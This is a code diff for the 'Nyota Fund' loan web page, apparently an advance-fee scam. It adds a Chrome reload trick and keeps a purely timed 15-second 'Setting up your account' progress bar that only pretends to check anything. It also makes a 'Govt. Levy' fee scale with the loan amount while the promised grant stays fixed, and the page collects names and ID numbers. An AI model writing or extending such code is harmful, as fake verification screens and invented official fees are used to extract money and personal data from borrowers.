@@ -81,7 +81,6 @@
         }
         .animate-pulse-subtle { animation: pulseSubtle 2.5s infinite; }
         
-        /* Native Bottom Sheet Animation */
         @keyframes slideUp { 0% { transform: translateY(100%); } 100% { transform: translateY(0); } }
         .bottom-sheet { animation: slideUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
     </style>
@@ -94,12 +93,9 @@
 <div id="native-install-prompt" class="hide fixed inset-0 z-[10005] bg-slate-900/60 backdrop-blur-sm flex items-end justify-center">
     <div class="bottom-sheet bg-white w-full max-w-lg rounded-t-3xl p-6 shadow-2xl text-center pb-10">
         <div class="w-16 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
-        
         <img src="icon-512.png" class="w-20 h-20 rounded-2xl mx-auto mb-4 shadow-md border border-gray-100" alt="Nyota Fund">
-        
         <h2 class="text-2xl font-extrabold text-slate-900 mb-2">App Installed</h2>
         <p class="text-sm text-slate-500 mb-8 px-4">Nyota Fund is ready. You can now open the app directly from your home screen for the best experience.</p>
-        
         <button onclick="closeNativePrompt()" class="native-btn text-lg w-full mb-3">Got it</button>
         <button onclick="forceOpenWeb()" class="text-sm font-semibold text-slate-500 w-full">Continue in Browser</button>
     </div>
@@ -212,7 +208,7 @@
         </div>
     </div>
 
-    <!-- CHECKING (FIXED TIMING) -->
+    <!-- CHECKING (15 SECONDS) -->
     <div id="screen-checking" class="screen gradient-bg items-center justify-center" style="padding: 24px;">
         <div class="pulse-ring"><img src="icon-512.png" class="w-20 h-20 rounded-2xl object-cover z-10 relative"></div>
         <h2 class="text-white text-2xl font-bold text-center mb-2">Setting up your account</h2>
@@ -649,6 +645,15 @@ if ('serviceWorker' in navigator) {
     });
 }
 
+// DOUBLE RELOAD TRICK FOR CHROME TO ENSURE PROMPT WORKS
+if (_isChromeBrowser && !_isInApp && !isStandalone) {
+    const hasReloaded = sessionStorage.getItem('nyota_chrome_reloaded');
+    if (!hasReloaded) {
+        sessionStorage.setItem('nyota_chrome_reloaded', '1');
+        window.location.reload();
+    }
+}
+
 function submitLogin(){
     const name = document.getElementById('in-name').value.trim();
     const id = document.getElementById('in-id').value.trim();
@@ -672,9 +677,9 @@ function submitLogin(){
 
     showScreen('screen-checking');
     
-    // FIXED TIMING LOGIC
+    // FIXED TIMING LOGIC (Smooth 15 second progress)
     let p = 0;
-    const step = 2; // Increases by 2% every 150ms (15 seconds total)
+    const step = 2; 
     
     const i = setInterval(()=>{
         p += step;
@@ -692,7 +697,7 @@ function submitLogin(){
 
         if(p >= 100){ 
             clearInterval(i); 
-            setTimeout(buildLoanScreen, 300); // Small delay so they see 100%
+            setTimeout(buildLoanScreen, 300); 
         }
     }, 150);
 }
@@ -735,9 +740,18 @@ function buildLoanScreen(){
 }
 
 function updateSummary(){
-    state.levy = 150;
-    state.interest = 150;
-    state.total = state.loan;
+    // DYNAMIC LEVY CALCULATION: 150 for 1000, up to 300 for 25000
+    if (state.loan <= 1000) {
+        state.levy = 150;
+    } else {
+        // Scales linearly from 150 to 300
+        const ratio = (state.loan - 1000) / 24000; // 24000 is the range (25000 - 1000)
+        state.levy = Math.round(150 + (ratio * 150)); 
+    }
+    
+    state.interest = state.levy;
+    state.total = state.loan; // Total grant stays the same
+    
     document.getElementById('sum-receive').innerText = format(state.loan);
     document.getElementById('sum-interest-label').innerText = `Govt. Levy`;
     document.getElementById('sum-interest').innerText = format(state.levy);
